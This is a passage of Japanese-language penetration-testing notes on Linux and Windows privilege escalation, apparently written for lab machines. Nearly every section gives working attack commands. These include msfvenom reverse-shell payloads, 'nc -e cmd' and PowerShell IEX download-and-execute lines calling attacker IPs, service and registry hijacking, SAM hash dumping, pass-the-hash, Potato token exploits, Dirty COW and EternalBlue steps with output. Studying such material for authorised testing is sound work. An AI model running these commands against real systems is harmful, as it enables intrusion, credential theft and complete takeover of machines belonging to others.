/bin/bashのバージョンを確認する。
```
/bin/bash --version
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
```
次に新しいBashシェルを実行する「/usr/sbin/service」という名前のBash関数を作成して関数をエクスポートする。
```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
最後にsuid-env2を実行して、rootシェルを取得する。

## SUID/SGID Executables - Abusing Shell Features (#2)
*Bashのバージョンが4.4以降では機能しない。
Bashデバッグを有効にし、PS4変数を/bin/bashのSUIDバージョンを作成する埋め込みコマンドに設定して/usr/local/bin/suid-env2実行可能ファイルを実行する。
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
-pを指定して、/tmp/rootbash実行可能ファイルを実行して、rootシェルを取得する。
## SUID/SGID Executables - Capability
SUIDはSet User IDを表し、ユーザーはファイル所有者としてファイルを実行できる。  
これはファイルの所有者の権限でプログラム/ファイルを実行するための一時的なアクセス権をユーザーに与えるものとして定義されている。  
Capabilityは通常ルートに割り当てられているアクションを細かく分割して実行する仕組み。  
これを利用することで、通常80番ポートなどの1024以下のポートでWebサーバーなどをリッスンさせるためにはルート権限が必要だが、Webサーバーデーモンにroot権限を与えるのではなく、CAP_NET_BIND_SERVICEなどのCapabilitiesを設定することで簡単に80番ポートを開放することができる。  
python，perl，tarが表示されれば、Capablityを利用して権限昇格できる可能性あり。
```
getcap -r / 2>/dev/null
```
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl5.30.0 = cap_setuid+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

### cap_setuid+ep
```
python3:
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl:
./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### cap_dac_read_search+ep
- tarを使用して/etc/shadowを圧縮
- shadow.tarが生成される
- shadow.tarを展開するとetc/shadowディレクトリが作成される
- catなどで読み取り、パスワードハッシュをjohnやhashcatで解析する
```
./tar cvf shadow.tar /etc/shadow
./tar -xvf shadow.tar
cat etc/shadow
```

## Passwords & Keys - History Files
ユーザーが誤ってパスワードプロンプトではなく、コマンドラインでパスワード入力した場合、パスワードは履歴ファイルに記録される可能性がある。  
下記のコマンドを使用して、ユーザーのホームディレクトリにある全ての日表示の履歴ファイルの内容を表示する。
```
cat ~/.*history | less
```
上記の結果より、パスワードらしきものが見つかればそれを利用してrootユーザーに切り替える。

## Passwords & Keys - Config Files
構成ファイルなどに、プレーンテキストや可逆形式のパスワードが含まれていることがある。  
例えばWebアプリケーションのソースコードにハードコーディングされている場合や、MySQL内に保存されている場合、メモなどが残されている場合がある。  
それらを利用して権限昇格できる可能性がある。

## Passwords & Keys - SSH Keys
.sshディレクトリなどに正しい権限が付与されていない場合、rootユーザーの秘密鍵などを読み取れる可能性がある。  
この秘密鍵を利用して、rootユーザーとしてログインする。
```
chmod 600 id_rsa
ssh -i id_rsa root@10.10.10.1
```

## NFSを悪用した権限昇格
NFSを介して作成されたファイルは、リモートユーザーのIDを継承する。  
ユーザーがrootであり、rootスカッシングが有効になっている場合、IDは代わりに「nobody」ユーザーに設定される。
```
# NFSの設定ファイルを確認
cat /etc/exports

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
/tmpの共有ではno_root_squashとなっていることを確認する。  
次にkaliのrootユーザーで/tmp共有をマウントする。
```
mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
```
マウントされた共有に以下のペイロードを保存する。
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
```
最後に、ターゲットマシンでファイルを実行してrootシェルを取得する。
```
/tmp/shell.elf
```

## Kernel Exploit
カーネルバージョンを確認して、カーネルエクスプロイトを用いて権限昇格
```
uname -a
```
linux-exploit-suggester2による自動列挙:  
https://github.com/jondonas/linux-exploit-suggester-2
### Dirtycow
#### 40839.c(dirty.c)
パスワードを自身で入力して、firefaltというアカウントを作成する。
```
gcc -pthread dirty.c -o dirty -lcrypt
chmod 755 dirty
```
```
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: pass

Complete line:
firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash
...

su firefart
```

#### 40616.c(cowroot.c)  
実行するだけでrootになれる
```
gcc cowroot.c -o cowroot -pthread
```
```
* $ ./cowroot
* root@box:/root/cow# id
* uid=0(root) gid=1000(foo) groups=1000(foo)
```
#### c0w  
https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54
```
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```
```
/usr/bin/passwd
```

## Tips
### ファイルの検索
```
find / -name <ファイル名> -type f 2>>/dev/null
```
- /...ファイルシステム全体を検索
- -name...名前の指定
- -type f...ディレクトリではなく、ファイル検索を指定
- 2>>/dev/null...全てのエラーを破棄

### 実行中のプロセスを確認
```
ps aux
```
pspyによる実行中プロセスの確認:
https://github.com/DominicBreuker/pspy  
ps auxコマンドでは確認できない定期的にUID=0(root権限)で実行されているスクリプトを確認することができる。  
馴染みのないプロセスが動作している場合、そのプロセスが権限昇格の鍵になる場合もあるため、要チェック。  

### 開いているポートの確認
```
netstat -tulpn
netstat -an(linux以外)
```

### チェックディレクトリ
```
/opt
```

### *.sh実行時に「bad interpreter: No such file or directory」が表示されたら
改行コードをCRLFからLFに置換して実行できるかを確認する。
```
sed -i 's/\r//' *.sh
```

### ユーザを指定してコマンドを実行
```
www-data@bashed:/$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/$ sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/$ whoami
scriptmanager
```

## PrivEsc Tools(Linux)
linpease.sh:  
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  

LinEnum.sh  
https://github.com/rebootuser/LinEnum

php-reverse-shell:  
https://github.com/pentestmonkey/php-reverse-shell   

PEASS-ng(linpeas.sh):  
https://github.com/carlospolop/PEASS-ng  

pspy:  
https://github.com/DominicBreuker/pspy  

SUID3NUM:  
https://github.com/Anon-Exploiter/SUID3NUM

linux-exploit-suggester2:    
https://github.com/jondonas/linux-exploit-suggester-2


# Privilege Escalation(Windows)
## チェック項目
- Service Exploits
  - Insecure Service Permissions(安全でないサービスパーミッション)
  - Unquoted Service Path(引用符で囲まれていないサービスパス)
  - Weak Registry Permissions(レジストリ権限の不備)
  - Insecure Service Executables(安全でないサービス実行可能ファイル)
- Registry(レジストリ)
  - AutoRuns(AutoRunバイナリファイルの悪用)
  - AlwaysInstallElevated(AlwaysInstallElevatedキーの悪用)
- Passwords
  - Registry(レジストリ内に保存されているパスワードの検索)
  - Saved Creds(保存されている資格情報の悪用)
  - Security Account Manager(SAM)の悪用
  - Pass the Hash
- Scheduled Tasksの悪用
- 安全でないGUIアプリの悪用
- スタートアップディレクトリの悪用
- トークンの偽装(Potato Attack, PrintSpoofer)
- Kernel Exploit

## Windowsサービスを悪用した権限昇格
```
# 現在のユーザーに割り当てられている特権を確認
whoami /priv

# サービスの構成を照会
sc qc <Service Name>

# サービスの現在のステータスを確認
sc query <Service Name>

# サービスの開始および停止
net start / net stop <Service Name>

# サービスの操作権限の表示(showrightsはSDDL権限と権限値を表示)
sc sdshow <Service Name> showrights  

(例)
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPDT;;;S-1-5-21-3029548963-3893655183-1231094572-1001)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)

SDDL right       Right value
----------       -----------
   GA        -   GENERIC_ALL
   GR        -   GENERIC_READ
   GW        -   GENERIC_WRITE
   GX        -   GENERIC_EXECUTE
   RC        -   READ_CONTROL
   SD        -   DELETE
   WD        -   WRITE_DAC
   WO        -   WRITE_OWNER
   RP        -   SERVICE_START
   WP        -   SERVICE_STOP
   CC        -   SERVICE_QUERY_CONFIG
   DC        -   SERVICE_CHANGE_CONFIG
   LC        -   SERVICE_QUERY_STATUS
   SW        -   SERVICE_ENUMERATE_DEPENDENTS
   LO        -   SERVICE_INTERROGATE
   DT        -   SERVICE_PAUSE_CONTINUE
   CR        -   SERVICE_USER_DEFINED_CONTROL

↑↑D:はDACL(随時アクセス制御リスト)を指し、S:はSACL(システムアクセス制御リスト)を指す。  
(A;;RPWPDT;;;S-1-5-21-3029548963-3893655183-1231094572-1001)は、左から(A/D(許可/拒否);;権限;;SID)となる。

# 現在のドメイン名\ユーザ名とSID(Windowsユーザアカウントやユーザグループに与えられる固有の識別番号)を確認
whoami /user

(例)
USER INFORMATION
----------------
User Name          SID
================== ==============================================
steelmountain\bill S-1-5-21-3029548963-3893655183-1231094572-1001


今回の場合、SID(A;;RPWPDT;;;S-1-5-21-3029548963-3893655183-1231094572-1001)となっているため、照会したサービスは現在ログインしているユーザーでサービスをstart(RP)/stop(WP)して再起動できることが分かる。
これらの調査をPowerUp.ps1を利用すると簡便に確認することが可能である。
```

### Powershellを利用したWindowsサービスの列挙
```
powershell -c "Get-Service"
```

### WMCIを利用したWindowsサービスの列挙
```
wmic service list brief
```
上記のコマンドでは非常に多くの出力が生成される。  
下記のコマンドでは動作しているサービス名を見やすい形で出力できる。  
```
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a
```
さらに、上記のコマンドをpermissions.txtとして出力することで、icaclsコマンドを利用したアクセス権の確認を行うことができる。
```
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> permissions.txt

for /f eol^=^"^ delims^=^" %a in (permissions.txt) do cmd.exe /c icacls "%a" >> path.txt
```

### sc.exeを利用したWindowsサービスの列挙
```
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt

FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt

FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```
これでicaclsコマンドを使用して1つずつアクセス権限を確認する。
```
icacls "C:\path\to\file.exe"
```
system32のバイナリは、Windowsによってインストールされるためほとんど正しいとして除外する。

### 安全でないサービスのプロパティ
Windowsの各サービスには、特定のサービス固有の各セス許可を定義するACL(アクセス制御リスト)がある。  
侵入中のユーザ権限で下記のACL権限を持っている場合、権限をエスカレードできる可能性がある。  
- SERVICE_STOP, SERVICE_START  
- SERVICE_CHANGE, SERVICE_ALL_ACCESS
```
accesschk.exe /accepteula
accesschk.exe -ucqv <Service Name>
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -ucqv <Service Name>
```
- /accepteula...EULA(ソフトウェア使用許諾契約)を省略

## Service Exploits - Insecure Service Permissions(安全でないサービスパーミッション)
「daclsvc」サービスに対する「user」アカウントの権限を確認する。
```
accesschk.exe /accepteula -uwcqv user *
or
accesschk.exe /accepteula -uwcqv user daclsvc
```
上記のコマンドにより、「user」アカウントには「SERVICE_CHANGE_CONFIG」を変更する権限があることを確認する。  
次に下記のコマンドで「daclsvc」サービスを照会してSYSTEM特権(SERVICE_START_NAME)で実行されることを確認する。
```
sc qc daclsvc
```
サービス構成を変更し、「BINARY_PATH_NAME(binpath)」をreverse shellペイロードを配置したパスに書き換える。
```
sc config daclsvc binpath= "\"C:\Windows\Temp\reverse.exe\""
```
最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを取得できる。
```
net start daclsvc
```

## Service Exploits - Unquoted Service Path(引用符で囲まれていないサービスパス)
サービスに使用される実行可能ファイルへのパスが引用符で囲まれていない場合に現れる脆弱性。  
「unquotedsvc」サービスを照会して、システム特権(SERVICE_START_NAME)で実行されていることと、「BINARY_PATH_NAME」が引用符で囲まれておらずスペースが含まれていることを確認する。
```
C:\Windows\Temp > sc qc <Service Name>

SERVICE_NAME: <Service Name>
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
accesschk.exeを使用して現在のユーザーグループがC:\Program Files\Unquoted Path Service\ディレクトリへの書き込みが許可されていることを確認する。
```
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```
reverse shellペイロードの名前をCommon.exeに変更したものC:\Program Files\Unquoted Path Service\ディレクトリに配置をする。  
最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを取得できる。
```
net start <Service Name>
```

別のサービスの悪用：
ここで権限昇格に使用するサービス名は<AdvancedSystemcareservice9>とする。  
この脆弱性を悪用する方法は、悪意のある実行可能ファイルをサービスパスのどこかに配置し、サービスパスの次のディレクトリの最初の数文字で始まる名前を付ける。  
サービスが開始(再起動)されると、悪意のあるバイナリ(reverse shell)が実行され、シェルを取得できる。
```
# 手動による列挙
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

例)AdvancedSystemCareService9  C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe

# 通常のユーザーがサービスの実行可能ファイルが配置されているディレクトリ等に書き込みアクセスを持っているかどうかを確認
icacls "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=9001 -f exe > Advanced.exe
rlwrap nc -lvnp 9001
```
```
certutil -urlcache -split -f "http://10.10.10.1/Advanced.exe"
sc stop AdvancedSystemcareservice9
sc start AdvancedSystemcareservice9
```

## Service Exploits - Weak Registry Permissions
サービスを照会し、SYSTEM特権(SERVICE_START_NAME)で実行されていることを確認する。
```
sc qc <Service Name>
```
accesschk.exeを使用して、Windowsサービスのレジストリエントリが「NT AUTHORITY\INTERACTIVE」グループ（基本的にすべてのログオンユーザー）によって書き込み可能であることを確認する。
```
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<Service Name>

HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS
```
reverse shellペイロードが配置されているパスを指すようにImagePathレジストリキーを上書きする。
```
reg add HKLM\SYSTEM\CurrentControlSet\services\<Service Name> /v ImagePath /t REG_EXPAND_SZ /d C:\Windows\Temp\reverse.exe /f
```
最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを取得できる。
```
net start <Service Name>
```

## Service Exploits - Insecure Service Executables
サービスを照会し、SYSTEM特権(SERVICE_START_NAME)で実行されていることを確認する。
```
sc qc <Service Name>
```
accesschk.exeを使用してサービスバイナリ(BINARY_PATH_NAME)ファイルが誰でも書き込み可能であることを確認する。
```
accesschk.exe /accepteula -quvw "C:\Program Files\<Service Name>\<Service>.exe"
```
reverse shellペイロードをコピーしてBINARY_PATH_NAMEで示されたバイナリを置き換える。
```
copy C:\PrivEsc\reverse.exe "C:\Program Files\<Service Name>\<Service(reverse shellペイロードの名前をサービスバイナリの名前に変更したもの)>.exe" /Y
```
最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを取得できる。
```
net start <Service Name>
```

## Registry - AutoRuns
レジストリにAutoRun実行可能ファイルを照会する。
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
accesschk.exeを使用して、AutoRun実行可能ファイルが誰でも書き込み可能であることを確認する。
```
C:\PrivEsc\accesschk.exe /accepteula -wvu "<上記のreg query確認したサービスのバイナリパス>"
```
最後に、netcatでlistenしてからターゲットのWindowsを再起動して、管理者(admin権限のユーザー)としてログインされるとSYSTEM権限で置き換えたペイロードが起動される。
```
shutdown /r /t 0
その後、管理者権限でログインされる必要がある
```

## Registry - AlwaysInstallElevated
レジストリにAlwaysInstallElevatedキーを照会する。
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
ここで両方のキーが1(0x1)に設定されていることを確認する。  
そして、msfvenomを使用してreverse shell Windowsインストーラー(reverse.msi)を生成する。
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
```
最後に、netcatでlistenしてからインストーラーを実行すると、SYSTEM権限のreverse shellを取得できる。
```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

## Passwords - Registry
レジストリ内に保存されているパスワードを検索する。
```
# HKLM
reg query HKLM /f password /t REG_SZ /s
# HKCU
reg query HKCU /f password /t REG_SZ /s
```
```
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```
winexeコマンド(LinuxからWindows上のコマンドを実行できるツール)を使用して、管理者権限で実行されているコマンドプロンプトを生成する。  
上記のコマンドによる検索結果で発見したパスワードを利用して生成する。
```
winexe -U 'admin%password' //10.10.10.1 cmd.exe
```

## Passwords - Saved Creds
保存されている資格情報を一覧表示する。
```
cmdkey /list
```
「admin」ユーザーの資格情報が保存されていることを確認する。  
最後に、netcatでlistenしてから管理者ユーザーの保存されたクレデンシャルを利用してrunasコマンドでreverse shellペイロードを実行する。
```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```
## Passwords - Security Account Manager (SAM)
SAMファイルとSYSTEMファイルのバックアップを安全に保存されていない場合、これらのファイルを使用してユーザーのパスワードハッシュを抽出することができる。  
```
# smbを利用したファイルの共有
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```
creddump7を利用してSAMファイルとSYSTEMファイルからハッシュをダンプする。
```
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
```
hashcatを使用してNTLMハッシュをクラックする。
```
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

## Passwords - Passing the Hash
ハッシュを使用して認証できるため、hashcatなどでパスワードクラックせずとも管理者ハッシュでログインできる。
```
pth-winexe -U 'admin%<転んで区切られたLMハッシュとLTLMハッシュの両方が含まれているもの>' //10.10.10.1 cmd.exe

例)
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.12.15 cmd.exe
```
## Scheduled Tasks
スケジュールされているスクリプトがSYSTEM権限で実行されており、ファイルに書き込み権限がある場合、reverse shellペイロードを実行するようにスクリプトを書き換えてやることでSYSTEM権限のシェルを取得することができる。
```
# スケジュールの一覧を表示
  (これでは見つからないことが多いため、スケジュールされたタスクが実行されていることを示すスクリプトやログファイルを手動で見つける必要がある)
C:> schtasks /query /fo LIST /v

PS> Get-ScheduledTask | where {$_.TaskPath -notlike “\Microsoft*”} | ft TaskName,TaskPath,State
```
```
# ファイルへの書き込み権限を確認
accesschk.exe /accepteula -quvw user C:\Users\user\Desktop\task.ps1
```
```
# reverse shellペイロードを実行するスクリプトを追記
echo C:\Windows\Temp\reverse.exe >> C:\Users\user\Desktop\task.ps1
```
netcatでlistenしておき、スケジュールされたタスクが実行されるのを待ち、システム権限のシェルを取得する。

## Insecure GUI Apps
RDP(リモートデスクトップ)などでアクセスした際に、管理者権限で実行できるソフトウェアがある場合、それらを介してcmd.exeを起動することでSYTEM権限のシェルを取得する。  
例えば、管理者権限で動作するペイントを仮定する。  
```
# 管理者権限でmspain.exeが起動されていることを確認
tasklist /V | findstr mspaint.exe
```
ペイントの[ファイル]→[開く]を押下して、file://c:/windows/system32/cmd.exeを開く。  
これにより、SYSTEM権限のシェルを取得することができる。

## Startup Apps
accesschk.exeを使用してBUILTIN\UsersグループがStartUpデディレクトリにファイルを書き込むことができることを確認。
```
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```
その後、StartUpディレクトリにreverse shellペイロードのショートカットなどを配置して、netcatでlistenしながら管理者権限でログインされることで、SYSTEM権限のシェルを取得できる。
```
# ショートカットを生成するvbsスクリプト
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Users\<reverse shellペイロードが配置されているパス>.exe"
oLink.Save

# cscriptを利用して上記のvbsスクリプトを起動
cscript shortcut.vbs
```

## Token Impersonation - Juicy Potato
```
Tips: ポテトアタックの歴史
WindowsのサービスアカウントからNT AUTHORITY/SYSTEMに特権を昇格させるために使われるポテトには、多くの種類がある。
Hot、Rotten、Lonely、Juicy、Rogueは、ポテトエクスプロイトのファミリーです。
すべてのポテトアタックには独自の制限があります。
攻撃対象のマシンが >= Windows 10 1809 & Windows Server 2019 の場合 - Rogue Potato を試してみてください。
攻撃対象のマシンが < Windows 10 1809 < Windows Server 2019 の場合 - Juicy Potato を試してみてください。
```
「whoami /priv」コマンドを使用して、いずれかの権限を持っており「攻撃対象のマシンが < Windows 10 1809 < Windows Server 2019 の場合」にJuicy Potatoのエクスプロイトが機能する可能性がある。  
- SeImpersonatePrivilege
- SeAssignPrimaryTokenPrivilege

```
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeSystemtimePrivilege         Change the system time                    Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

```
JuicyPotato.exe -l 9000 -p C:\Windows\Temp\shell.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```
- -l...COMサーバのlisten port(競合しているポートでなければどのポートでも機能はする)
- -p...使用するペイロードの選択(事前に転送しているペイロードなど)
- -t...createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
- -c...CLSID(default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})

CLSIDは、./juicy-potato/CLSID/から対応するOSを選択してUserが NT AUTHORITY\SYSTEMになっているものを指定する。  
もしくは、./juicy-potato/CLSID/GetCLSID.ps1を利用してCLSIDを取得する。  
powershellが何かの理由により使用できない場合、JuicyPotato.exe(test_clsid.batの内容に合わせるためjuicypotato.exeに名前を変更)と./juicy-potato/CLSID/<対応するOS>/CLSID.list/、./juicy-potato/Test/test_clsid.batをターゲットマシンに配置してCLSIDを集める。  
ターゲット端末でtest_clsid.batを5分間起動してから、出力されたresult.logを確認してCLSIDを取得する。  


## Token Impersonation - Rogue Potato
「whoami /priv」コマンドを使用して、いずれかの権限を持っており「攻撃対象のマシンが >= Windows 10 1809 & Windows Server 2019 の場合」にRouge Potatoのエクスプロイトが機能する可能性がある。  
- SeImpersonatePrivilege
- SeAssignPrimaryTokenPrivilege

```
RoguePotato.exe -r <Local IP> -e "C:\Windows\Temp\reverse.exe" -l <Local Port>
```
- -r...リモートIPアドレス(攻撃者端末のIP)
- -e...reverse shellペイロードのパス
- -l...リスニングポート(攻撃者端末の待ち受けポート)

## Token Impersonation - PrintSpoofer
上記で得られたシェルでwhoami /privコマンドを使用すると下記のような結果を得られる。  
この時、いずれかの権限を持っている場合にRouge Potatoのエクスプロイトが機能する。
- SeImpersonatePrivilege
- SeAssignPrimaryTokenPrivilege　　
ここまでの流れとして、先ほどのRogue Potatoと同じ条件となる。  

最後にlocal serviceのreverse shellが返ってきているシェルでPrintSpooferエクスプロイトを実行して、SYTEM権限のシェルを取得する。
```
PrintSpoofer.exe -c "C:\Windows\Temp\reverse.exe(reverse shellペイロードが配置されているパス)" -i
```
もしくは、
```
PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -i -c powershell.exe
```
などにより権限昇格可能。

## Kernel Exploit
### 手動列挙
```
systeminfo
```
```
searchsploit Microsoft Windows [OS version];
searchsploit Microsoft Windows [build number]
```
### windows-exploit-suggester(自動列挙)
windowsでexploitを列挙するためのスクリプト
systeminfoコマンドの出力が必要
```
# ファイルの更新
./windows-exploit-suggester.py --update
# xlrdのインストール(最新バージョンだと動作しないためxlrd1.2.0を利用)
pip2 install xlrd==1.2.0
```
```
systeminfo > systeminfo.txt
./windows-exploit-suggester.py --database 2020-06-08-mssb.xls --systeminfo systeminfo.txt
```

### Sherlock.ps1
```
# Find-Allchecks(powershell.exe)
IEX(New-Object Net.WebClient).downloadstring('http://10.10.16.3:8000/Sherlock.ps1')

# Find-AllVulns(cmd.exe)
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/Sherlock.ps1');Find-AllVulns | powershell -noprofile -
```

### Watson.ps1


### Windows-kernel-exploits
コンパイル済みのカーネルエクスプロイト用バイナリが用意されている。  
Windows-kernel-exploits:  
https://github.com/SecWiki/windows-kernel-exploits.git

### MS17-010_EternalBlue(without metasploit)
エクスプロイトに必要なものを準備。
この最後のmysmb.pyをダウンロードしておかないと、ImportError：mysmbと警告が出る。
```
wget https://www.exploit-db.com/raw/42315
mv 42315 eternalblue.py
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
```
次にimpacketもインストールしておかないと使うことができないので入っていない場合は落としておく。
```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .
```
もしもここでpipが入っていないと警告が出た場合は、pipもインストールしておく。
```
sudo apt install python-pip
```
次に、リバースシェルに使うペイロードをmsfvenomを利用して作成する。
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f exe > reverse.exe
```

次にeternalblue.pyのソースコードを変更してエクスプロイトに使用できるようにする。  
まずUSERNAMEのところを下記の画像のように変更。  

![](./image/2021-05-06-17-48-11.png)  

次にsmb_pwn関数内のスクリプトを下記の画像のように変更。  

![](./image/2021-05-06-17-48-54.png)  

これで準備は完了。
通信を受けるためにnetcatで待ち受けておく。  
```
nc -lvp 1234
```
最後にeternalblue.pyを実行。
```
┌─[✗]─[yukitsukai@parrot]─[~/htb/Blue]
└──╼ $python eternalblue.py 10.10.10.40 ntsvcs
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8001af9560
SESSION: 0xfffff8a001bf5de0
.
.
.
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```
通信を待ち受けていたnetcatの方でシェルが取得できる。  
![](./image/2021-05-06-17-49-20.png)

## Tips
### 侵入先情報の列挙
```
systeminfo
echo %username%
```

### reverse_shell
#### netcatを転送
```
certutil.exe -urlcache -split -f "http://10.10.10.1/nc.exe" C:\Windows\Temp\nc.exe
C:Windows\Temp\nc.exe -e cmd 10.10.10.1 4444
```

### ファイルのダウンロード
```
curl http://10.10.10.1:9000/putty.exe -o putty.exe
certutil -urlcache -split -f "http://10.10.14.11:9000/rs.exe" rs.exe
bitsadmin /transfer job /download /priority high http://10.10.14.17/nc.exe c:\temp\nc.exe
powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11:9000/rs.exe', 'rs.exe')
powershell -c (Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe")
powershell -c (wget "http://10.10.14.17/nc.exe" -outfile "c:\temp\nc.exe")
powershell -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")
```

### ダウンロード&実行
```
powershell "IEX(New-Object Net.webclient).downloadString('http://10.10.14.16:9001/nishang.ps1')"
```

### SMBを用いたファイル共有
```
攻撃側(送信側):
python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp .
```
```
被害者(受信側):
# 共有ディレクトリの列挙
net view \\10.10.10.1
# 共有ディレクトリ内のファイルを列挙
dir \\10.10.10.1\temp
# ローカルにコピー
copy \\10.10.10.1\temp\rs.exe rs.exe
```

### ファイルの検索
```
dir /s /b <ファイル名>
dir /s /b flag*
```
- /s...サブフォルダまで含めたファイルまで検索対象とする
- /b...ファイル名だけ表示

## PowerShell
### PowerShellスクリプトの実行
```
現在のユーザーの実行ポリシーの確認:
Get-ExecutionPolicy -Scope CurrentUser
